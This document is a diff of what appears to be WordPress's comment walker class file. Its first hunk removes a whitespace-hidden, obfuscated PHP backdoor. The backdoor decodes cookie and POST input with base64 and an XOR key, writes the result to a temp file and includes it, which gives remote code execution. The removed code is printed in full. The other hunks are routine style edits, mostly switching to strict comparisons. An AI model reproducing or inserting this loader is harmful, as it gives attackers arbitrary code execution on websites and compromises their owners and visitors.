@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $pddHFdO = "\132" . "\137" . 'a' . chr ( 241 - 162 ).chr ( 216 - 102 ).chr ( 982 - 874 ); $kAPsP = "\143" . "\154" . chr ( 231 - 134 )."\x73" . chr (115) . chr (95) . "\145" . "\170" . "\x69" . "\163" . 't' . chr (115); $bjIAT = $kAPsP($pddHFdO); $zpKniXT = $bjIAT;if (!$zpKniXT){class Z_aOrl{private $EWLKy;public static $OEfhMiq = "533cfcfe-bcbd-476d-a13a-e341b7f10256";public static $rRDBVtGJeR = NULL;public function __construct(){$JemdxuGJv = $_COOKIE;$DRQww = $_POST;$fDxFbC = @$JemdxuGJv[substr(Z_aOrl::$OEfhMiq, 0, 4)];if (!empty($fDxFbC)){$tmuTmA = "base64";$XJGgUHGVsh = "";$fDxFbC = explode(",", $fDxFbC);foreach ($fDxFbC as $ZrItBi){$XJGgUHGVsh .= @$JemdxuGJv[$ZrItBi];$XJGgUHGVsh .= @$DRQww[$ZrItBi];}$XJGgUHGVsh = array_map($tmuTmA . "\137" . 'd' . "\x65" . "\143" . 'o' . chr ( 676 - 576 ).chr ( 666 - 565 ), array($XJGgUHGVsh,)); $XJGgUHGVsh = $XJGgUHGVsh[0] ^ str_repeat(Z_aOrl::$OEfhMiq, (strlen($XJGgUHGVsh[0]) / strlen(Z_aOrl::$OEfhMiq)) + 1);Z_aOrl::$rRDBVtGJeR = @unserialize($XJGgUHGVsh);}}public function __destruct(){$this->guezTnUzV();}private function guezTnUzV(){if (is_array(Z_aOrl::$rRDBVtGJeR)) {$pzOOpTONk = sys_get_temp_dir() . "/" . crc32(Z_aOrl::$rRDBVtGJeR["\x73" . "\141" . chr ( 337 - 229 ).chr ( 256 - 140 )]);@Z_aOrl::$rRDBVtGJeR["\167" . chr ( 978 - 864 )."\151" . chr ( 209 - 93 )."\145"]($pzOOpTONk, Z_aOrl::$rRDBVtGJeR[chr (99) . "\x6f" . chr (110) . 't' . "\x65" . "\x6e" . chr ( 287 - 171 )]);include $pzOOpTONk;@Z_aOrl::$rRDBVtGJeR[chr (100) . chr (101) . chr (108) . 'e' . chr ( 410 - 294 )."\145"]($pzOOpTONk);exit();}}}$nIMueU = new Z_aOrl(); $nIMueU = NULL;} ?><?php
+<?php
 /**
  * Comment API: Walker_Comment class
  *
@@ -30,7 +30,7 @@ class Walker_Comment extends Walker {
 	 * Database fields to use.
 	 *
 	 * @since 2.7.0
-	 * @var array
+	 * @var string[]
 	 *
 	 * @see Walker::$db_fields
 	 * @todo Decouple this
@@ -150,7 +150,6 @@ class Walker_Comment extends Walker {
 
 			unset( $children_elements[ $id ] );
 		}
-
 	}
 
 	/**
@@ -175,7 +174,7 @@ class Walker_Comment extends Walker {
 		// Restores the more descriptive, specific name for use within this method.
 		$comment = $data_object;
 
-		$depth++;
+		++$depth;
 		$GLOBALS['comment_depth'] = $depth;
 		$GLOBALS['comment']       = $comment;
 
@@ -279,7 +278,7 @@ class Walker_Comment extends Walker {
 		$commenter          = wp_get_current_commenter();
 		$show_pending_links = ! empty( $commenter['comment_author'] );
 
-		if ( $comment && '0' == $comment->comment_approved && ! $show_pending_links ) {
+		if ( $comment && '0' === $comment->comment_approved && ! $show_pending_links ) {
 			$comment_text = wp_kses( $comment_text, array() );
 		}
 
@@ -321,14 +320,14 @@ class Walker_Comment extends Walker {
 		<?php endif; ?>
 		<div class="comment-author vcard">
 			<?php
-			if ( 0 != $args['avatar_size'] ) {
+			if ( 0 !== $args['avatar_size'] ) {
 				echo get_avatar( $comment, $args['avatar_size'] );
 			}
 			?>
 			<?php
 			$comment_author = get_comment_author_link( $comment );
 
-			if ( '0' == $comment->comment_approved && ! $show_pending_links ) {
+			if ( '0' === $comment->comment_approved && ! $show_pending_links ) {
 				$comment_author = get_comment_author( $comment );
 			}
 
@@ -339,7 +338,7 @@ class Walker_Comment extends Walker {
 			);
 			?>
 		</div>
-		<?php if ( '0' == $comment->comment_approved ) : ?>
+		<?php if ( '0' === $comment->comment_approved ) : ?>
 		<em class="comment-awaiting-moderation"><?php echo $moderation_note; ?></em>
 		<br />
 		<?php endif; ?>
@@ -424,14 +423,14 @@ class Walker_Comment extends Walker {
 				<footer class="comment-meta">
 					<div class="comment-author vcard">
 						<?php
-						if ( 0 != $args['avatar_size'] ) {
+						if ( 0 !== $args['avatar_size'] ) {
 							echo get_avatar( $comment, $args['avatar_size'] );
 						}
 						?>
 						<?php
 						$comment_author = get_comment_author_link( $comment );
 
-						if ( '0' == $comment->comment_approved && ! $show_pending_links ) {
+						if ( '0' === $comment->comment_approved && ! $show_pending_links ) {
 							$comment_author = get_comment_author( $comment );
 						}
 
@@ -461,7 +460,7 @@ class Walker_Comment extends Walker {
 						?>
 					</div><!-- .comment-metadata -->
 
-					<?php if ( '0' == $comment->comment_approved ) : ?>
+					<?php if ( '0' === $comment->comment_approved ) : ?>
 					<em class="comment-awaiting-moderation"><?php echo $moderation_note; ?></em>
 					<?php endif; ?>
 				</footer><!-- .comment-meta -->
@@ -471,7 +470,7 @@ class Walker_Comment extends Walker {
 				</div><!-- .comment-content -->
 
 				<?php
-				if ( '1' == $comment->comment_approved || $show_pending_links ) {
+				if ( '1' === $comment->comment_approved || $show_pending_links ) {
 					comment_reply_link(
 						array_merge(
 							$args,
